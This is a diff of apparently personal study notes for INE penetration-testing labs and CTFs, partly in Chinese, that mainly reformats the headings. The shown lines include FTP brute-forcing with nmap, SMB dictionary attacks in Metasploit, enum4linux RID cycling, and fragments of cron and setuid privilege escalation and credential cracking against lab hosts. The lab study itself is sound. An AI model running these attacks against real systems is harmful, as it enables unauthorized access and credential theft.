@@ -1,10 +1,5 @@
-Exploiting Linux Vulnerabilities
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Shellshock 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-SSH login
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-ProFTP Recon:Basics
+# Exploiting Linux Vulnerabilities
+## ProFTP Recon:Basics
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	=> ProFTPd 是一款開源 FTP 伺服器
 	/usr/share/metasploit-framework/data/wordlists/common_users.txt
@@ -26,9 +21,8 @@ ProFTP Recon:Basics
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	echo "sysadmin" > users
 	nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Samba Recon:Dictionary Attack
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Samba Recon:Dictionary Attack
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nano users.txt [jane]
 	msfconsole -q
 		use auxiliary/scanner/smb/smb_login
@@ -67,8 +61,7 @@ Samba Recon:Dictionary Attack
 	[+] 192.162.248.3:139 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	RID cycling : enum4linux -r -u admin -p password1 demo.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Privilege Escalation
+## Linux Privilege Escalation
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Cron Jobs Gone Wild II
 	=> http://target.ine.local:8000
@@ -108,8 +101,7 @@ Linux Privilege Escalation
 	cd /root
 	ls -l
 	cat flag
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Exploiting Setuid Programs
+## Exploiting Setuid Programs
 	=> https://en.wikipedia.org/wiki/Setuid
 	target.ine.local:8000
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -129,8 +121,7 @@ Exploiting Setuid Programs
 	cd /root
 	ls
 	cat flag
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Credential Dumping
+## Linux Credential Dumping
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Password Cracker:Linux
 	=> demo.ine.local
@@ -168,11 +159,10 @@ Linux Credential Dumping
 	Auxiliary failed: NoMethodError undefined method `each' for nil:NilClass
 	/etc/init.d/postgresql start
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: System-Host Based Attacks CTF 2
-=> 獲得未經授權的存取、提升權限或破壞主機的正常功能
-=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Host & Network Penetration Testing: System-Host Based Attacks CTF 2
+	=> 獲得未經授權的存取、提升權限或破壞主機的正常功能
+	=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target1.ine.local 
 	80/tcp open  http    Apache httpd 2.4.6 ((Unix))
 
